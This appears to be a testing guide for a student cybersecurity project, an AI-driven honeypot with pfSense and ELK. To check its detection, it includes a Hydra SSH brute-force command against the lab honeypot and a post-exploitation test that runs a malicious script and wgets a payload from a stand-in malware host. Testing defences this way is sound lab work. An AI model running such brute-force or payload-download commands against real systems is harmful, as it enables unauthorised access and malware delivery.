# 🧪 Comprehensive Testing & Verification Guide
AI-Powered Dynamic Honeypot | BS Cyber Security FYP

## 1. Initial Deployment Test
**Goal**: Verify the entire containerized/virtualized stack is communicating.
- [ ] **Check pfSense**: Login to `10.10.10.1`. Go to `Status > Interfaces`. Ensure WAN/LAN/DMZ are UP.
- [ ] **Check ELK**: Login to `10.10.10.20`. Run `systemctl status elasticsearch`.
- [ ] **Check AI Engine**: Run `start.bat` on the host. Look for `[INFO] Connection to Elasticsearch verified` in the console.

## 2. Attack Simulation Scenarios
To test the "Sharpness" of the detection, perform these 3 core tests from an external machine (Parrot OS / Kali):

### Test A: Brute Force Detection (Hydra)
```bash
# Run from Attacker VM
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.20.10
```
- **Expected Result**: AI Engine log will show `[ALERT] High velocity login attempt from X.X.X.X`. 
- **Auto-Action**: pfSense rule will automatically be created to BLOCK the attacker.

### Test B: Post-Exploitation Behavioral Analysis (Manual)
```bash
# SSH into Honeypot manually (creds: root/root)
ssh root@10.10.20.10
# Run suspicious commands
chmod +x malicious_script.sh
./malicious_script.sh
wget http://malware-site.com/payload
```
- **Expected Result**: AI Engine will calculate high `cmd_entropy`.
- **Auto-Action**: Session will be terminated and IP blocked within 5 seconds.

### Test C: Whitelist Verification
- Add your host IP to `whitelist_ips` in `configs/config.json`.
- Perform a simulated attack.
- **Expected Result**: AI Engine logs `[INFO] Skipping block for whitelisted IP`.

## 3. Visual Verification
- Open Kibana at `http://10.10.10.20:5601`.
- View the "AI Defense Overview" dashboard.
- Observe the "SHAP Interpretability" chart in `logs/plots/feature_importance.png`.

---
*Operational Testing Protocol by System AI*
